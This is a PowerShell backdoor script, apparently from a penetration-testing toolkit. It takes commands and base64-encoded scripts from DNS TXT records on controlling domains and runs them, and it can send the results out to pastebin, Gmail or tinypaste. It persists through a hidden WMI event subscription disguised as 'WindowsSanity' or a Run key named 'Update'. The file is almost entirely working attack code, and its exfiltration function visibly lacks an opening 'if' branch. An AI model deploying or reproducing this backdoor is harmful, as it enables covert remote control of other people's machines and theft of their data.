
<#
.SYNOPSIS
Payload which acts as a backdoor and is capable of recieving commands and PowerShell scripts from DNS TXT queries.

.DESCRIPTION
This payload continuously queries a subdomain's TXT records. It could be
sent commands and powershell scripts to be executed on the target machine by
TXT messages of a domain.

.PARAMETER startdomain
The domain (or subdomain) whose TXT records would be checked regularly for further instructions.

.PARAMETER cmdstring
 The string, if responded by TXT record of startdomain, will make the payload  query "commanddomain" for commands.
 
.PARAMETER commanddomain
The domain (or subdomain) whose TXT records would be used to issue commands to the payload.

.PARAMETER psstring
 The string, if responded by TXT record of startdomain, will make the payload  query "psdomain" for base64 encoded powershell script. 

.PARAMETER psdomain
The domain (or subdomain) which would be used to provide powershell scripts from its TXT records. 

.PARAMETER stopstring
The string, if responded by TXT record of startdomain, will stop this payload on the target.

.PARAMETER AUTHNS
Authoritative Name Server for the domains (or startdomain in case you are using separate domains). Startdomain 
would be changed for commands and an authoritative reply shoudl reflect changes immediately.

.PARAMETER exfil
Use this parameter to use exfiltration methods to return results of the backdoor.

.PARAMETER dev_key
The Unique API key provided by pastebin when you register a free account.
Unused for tinypaste.
Unused for gmail option.

.PARAMETER username
Username for the pastebin account where keys would be pasted.
Username for the tinypaste account where keys would be pasted.
Username for the gmail account where attachment would be sent as an attachment.

.PARAMETER password
Password for the pastebin account where keys would be pasted.
Password for the tinypaste account where keys would be pasted.
Password for the gmail account where keys would be sent.

.PARAMETER keyoutoption
The method you want to use for exfitration of data.
"0" for displaying on console
"1" for pastebin.
"2" for gmail
"3" for tinypaste   

.EXAMPLE
PS > .\DNS_TXT_Pwnage.ps1
The payload will ask for all required options.

.EXAMPLE
PS > .\DNS_TXT_Pwnage.ps1 start.alteredsecurity.com begincommands command.alteredsecurity.com startscript enscript.alteredsecurity.com stop ns8.zoneedit.com
In the above example if you want to execute commands. TXT record of start.alteredsecurity.com
must contain only "begincommands" and command.alteredsecurity.com should conatin a single command 
you want to execute. The TXT record could be changed live and the payload will pick up updated 
record to execute new command.

To execute a script in above example, start.alteredsecurity.com must contain "startscript". As soon it matches, the payload will query 
psdomain looking for a base64encoded powershell script. Use the StringToBase64 function to encode scripts to base64.

.EXAMPLE
PS > .\DNS_TXT_Pwnage.ps1 start.alteredsecurity.com begincommands command.alteredsecurity.com startscript enscript.alteredsecurity.com stop ns8.zoneedit.com -exfil  <devkey> <username> <password> <keyoutoption>
Use above command for using exfiltration methods.

.LINK
http://labofapenetrationtester.blogspot.com/
http://code.google.com/p/nishang
#>


[CmdletBinding(DefaultParameterSetName="noexfil")]
Param( [Parameter(Parametersetname="exfil")] [Switch] $persist,
[Parameter(Parametersetname="exfil")] [Switch] $exfil,
[Parameter(Position = 0, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 0, Mandatory = $True, Parametersetname="noexfil")] [String]$startdomain,
[Parameter(Position = 1, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 1, Mandatory = $True, Parametersetname="noexfil")] [String]$cmdstring,
[Parameter(Position = 2, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 2, Mandatory = $True, Parametersetname="noexfil")] [String]$commanddomain,
[Parameter(Position = 3, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 3, Mandatory = $True, Parametersetname="noexfil")] [String]$psstring,
[Parameter(Position = 4, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 4, Mandatory = $True, Parametersetname="noexfil")] [String]$psdomain,
[Parameter(Position = 5, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 5, Mandatory = $True, Parametersetname="noexfil")] [String]$StopString,
[Parameter(Position = 6, Mandatory = $True, Parametersetname="exfil")] [Parameter(Position = 6, Mandatory = $True, Parametersetname="noexfil")] [String]$AuthNS,    
[Parameter(Position = 7, Mandatory = $True, Parametersetname="exfil")] [String]$dev_key,
[Parameter(Position = 8, Mandatory = $True, Parametersetname="exfil")] [String]$username,
[Parameter(Position = 9, Mandatory = $True, Parametersetname="exfil")] [String]$password,
[Parameter(Position = 10, Mandatory = $True, Parametersetname="exfil")] [String]$keyoutoption )

function DNS_TXT_Pwnage
{
    $body = @'    
function DNS-TXT-Logic ($Startdomain, $cmdstring, $commanddomain, $psstring, $psdomain, $Stopstring, $AuthNS, $dev_key, $username, $password, $keyoutoption, $exfil)
{
    while($true)
    {
        $exec = 0
        start-sleep -seconds 5
        $getcode = (Invoke-Expression "nslookup -querytype=txt $startdomain $AuthNS") 
        $tmp = $getcode | select-string -pattern "`""
        $startcode = $tmp -split("`"")[0]
        if ($startcode[1] -eq $cmdstring)
        {
            start-sleep -seconds 5
            $getcommand = (Invoke-Expression "nslookup -querytype=txt $commanddomain $AuthNS") 
            $temp = $getcommand | select-string -pattern "`""
            $command = $temp -split("`"")[0]
            $pastevalue = Invoke-Expression $command[1]
            $pastevalue
            $exec++
            if ($exfil -eq $True)
            {
                $pastename = $env:COMPUTERNAME + " Results of DNS TXT Pwnage: "
                Do-Exfiltration "$pastename" "$pastevalue" "$username" "$password" "$dev_key" "$keyoutoption"
            }
            if ($exec -eq 1)
            {
                Start-Sleep -Seconds 60
            }
        }

        if ($startcode[1] -match $psstring)
        {
                      
            $getcommand = (Invoke-Expression "nslookup -querytype=txt $psdomain $AuthNS") 
            $temp = $getcommand | select-string -pattern "`""
            $tmp1 = ""
            foreach ($txt in $temp)
            {
                $tmp1 = $tmp1 + $txt
            }
            $command = $tmp1 -replace '\s+', "" -replace "`"", ""
            $pastevalue = powershell.exe -encodedcommand $command
            $pastevalue
            #Problem with using stringtobase64 to encode a file. After decoding it creates spaces in between the script.
            #A temporary workaround is using a semicolon ";" separated script in one line.
            $exec++
            if ($exfil -eq $True)
            {
                $pastename = $env:COMPUTERNAME + " Results of DNS TXT Pwnage: "
                Do-Exfiltration "$pastename" "$pastevalue" "$username" "$password" "$dev_key" "$keyoutoption"
            }
            if ($exec -eq 1)
            {
                Start-Sleep -Seconds 60
            }

        }
        
        if($startcode[1] -eq $StopString)
        {
            break
        }
    }
}
'@

$exfiltration = @'
function Do-Exfiltration($pastename,$pastevalue,$username,$password,$dev_key,$keyoutoption,$filename)
    {
        function post_http($url,$parameters) 
        { 
            $http_request = New-Object -ComObject Msxml2.XMLHTTP 
            $http_request.open("POST", $url, $false) 
            $http_request.setRequestHeader("Content-type","application/x-www-form-urlencoded") 
            $http_request.setRequestHeader("Content-length", $parameters.length); 
            $http_request.setRequestHeader("Connection", "close") 
            $http_request.send($parameters) 
            $script:session_key=$http_request.responseText 
        } 

        function Get-MD5()
        {
            #http://stackoverflow.com/questions/10521061/how-to-get-a-md5-checksum-in-powershell
            $md5 = new-object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
            $utf8 = new-object -TypeName System.Text.UTF8Encoding
            $hash = [System.BitConverter]::ToString($md5.ComputeHash($utf8.GetBytes($password))).Replace("-", "").ToLower()
            return $hash
        }

        elseif ($keyoutoption -eq "1")
        {
            $utfbytes  = [System.Text.Encoding]::UTF8.GetBytes($pastevalue)
            $pastevalue = [System.Convert]::ToBase64String($utfbytes)
            post_http "https://pastebin.com/api/api_login.php" "api_dev_key=$dev_key&api_user_name=$username&api_user_password=$password" 
            post_http "https://pastebin.com/api/api_post.php" "api_user_key=$session_key&api_option=paste&api_dev_key=$dev_key&api_paste_name=$pastename&api_paste_code=$pastevalue&api_paste_private=2" 
        }
        
        elseif ($keyoutoption -eq "2")
        {
            #http://stackoverflow.com/questions/1252335/send-mail-via-gmail-with-powershell-v2s-send-mailmessage
            $smtpserver = “smtp.gmail.com”
            $msg = new-object Net.Mail.MailMessage
            $smtp = new-object Net.Mail.SmtpClient($smtpServer )
            $smtp.EnableSsl = $True
            $smtp.Credentials = New-Object System.Net.NetworkCredential(“$username”, “$password”); 
            $msg.From = “$username@gmail.com”
            $msg.To.Add(”$username@gmail.com”)
            $msg.Subject = $pastename
            $msg.Body = $pastevalue
            if ($filename)
            {
                $att = new-object Net.Mail.Attachment($filename)
                $msg.Attachments.Add($att)
            }
            $smtp.Send($msg)
        }

        elseif ($keyoutoption -eq "3")
        {
            
            $hash = Get-MD5
            post_http "http://tny.cz/api/create.xml" "paste=$pastevalue&title=$pastename&is_code=0&is_private=1&password=$dev_key&authenticate=$username`:$hash"
        }

    }
'@

    
    $modulename = $script:MyInvocation.MyCommand.Name
    if($persist -eq $True)
    {
        $name = "persist.vbs"
        $options = "DNS-TXT-Logic $Startdomain $cmdstring $commanddomain $psstring $psdomain $Stopstring $AuthNS"
        if ($exfil -eq $True)
        {
            $options = "DNS-TXT-Logic $Startdomain $cmdstring $commanddomain $psstring $psdomain $Stopstring $AuthNS $dev_key $username $password $keyoutoption $exfil"
        }
        Out-File -InputObject $body -Force $env:TEMP\$modulename
        Out-File -InputObject $exfiltration -Append $env:TEMP\$modulename
        Out-File -InputObject $options -Append $env:TEMP\$modulename
        echo "Set objShell = CreateObject(`"Wscript.shell`")" > $env:TEMP\$name
        echo "objShell.run(`"powershell -WindowStyle Hidden -executionpolicy bypass -file $env:temp\$modulename`")" >> $env:TEMP\$name
        $currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent()) 
        if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -eq $true)
        {
            $scriptpath = $env:TEMP
            $scriptFileName = "$scriptpath\$name"
            $filterNS = "root\cimv2"
            $wmiNS = "root\subscription"
            $query = @"
             Select * from __InstanceCreationEvent within 30 
             where targetInstance isa 'Win32_LogonSession' 
"@
            $filterName = "WindowsSanity"
            $filterPath = Set-WmiInstance -Class __EventFilter -Namespace $wmiNS -Arguments @{name=$filterName; EventNameSpace=$filterNS; QueryLanguage="WQL"; Query=$query}
            $consumerPath = Set-WmiInstance -Class ActiveScriptEventConsumer -Namespace $wmiNS -Arguments @{name="WindowsSanity"; ScriptFileName=$scriptFileName; ScriptingEngine="VBScript"}
            Set-WmiInstance -Class __FilterToConsumerBinding -Namespace $wmiNS -arguments @{Filter=$filterPath; Consumer=$consumerPath} |  out-null
        }
        else
        {
            New-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Update -PropertyType String -Value $env:TEMP\$name -force
            echo "Set objShell = CreateObject(`"Wscript.shell`")" > $env:TEMP\$name
            echo "objShell.run(`"powershell -WindowStyle Hidden -executionpolicy bypass -file $env:temp\$modulename`")" >> $env:TEMP\$name
        }
    }
    else
    {
        $options = "DNS-TXT-Logic $Startdomain $cmdstring $commanddomain $psstring $psdomain $Stopstring $AuthNS"

        if ($exfil -eq $True)
        {
            $options = "DNS-TXT-Logic $Startdomain $cmdstring $commanddomain $psstring $psdomain $Stopstring $AuthNS $dev_key $username $password $keyoutoption $exfil"
        }
        Out-File -InputObject $body -Force $env:TEMP\$modulename
        Out-File -InputObject $exfiltration -Append $env:TEMP\$modulename
        Out-File -InputObject $options -Append $env:TEMP\$modulename
        Invoke-Expression $env:TEMP\$modulename     
    }

}

DNS_TXT_Pwnage